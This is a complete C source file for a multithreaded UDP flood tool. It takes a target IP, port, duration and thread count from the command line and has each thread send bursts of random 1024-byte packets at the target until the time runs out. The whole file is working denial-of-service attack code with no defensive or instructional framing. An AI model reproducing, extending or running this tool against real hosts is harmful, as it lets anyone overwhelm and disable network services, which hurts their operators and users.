#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD 1024      // Large packet size (avoid fragmentation)
#define BURST_PER_LOOP 2000000     // Send this many packets per loop

struct thread_data {
    char ip[64];
    int port;
    int duration;
};

void *flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    target.sin_addr.s_addr = inet_addr(data->ip);

    srand(time(NULL) ^ pthread_self());

    unsigned char packet[MAX_PAYLOAD];

    time_t end_time = time(NULL) + data->duration;

    while (time(NULL) < end_time) {
        for (int i = 0; i < MAX_PAYLOAD; i++) {
            packet[i] = rand() % 256;
        }

        for (int i = 0; i < BURST_PER_LOOP; i++) {
            sendto(sock, packet, MAX_PAYLOAD, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    printf("Starting UDP flood on %s:%d for %d seconds using %d threads\n", ip, port, duration, threads);

    pthread_t thread_ids[threads];

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        strncpy(data->ip, ip, sizeof(data->ip));
        data->port = port;
        data->duration = duration;

        pthread_create(&thread_ids[i], NULL, flood, (void *)data);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Flood complete.\n");
    return 0;
}
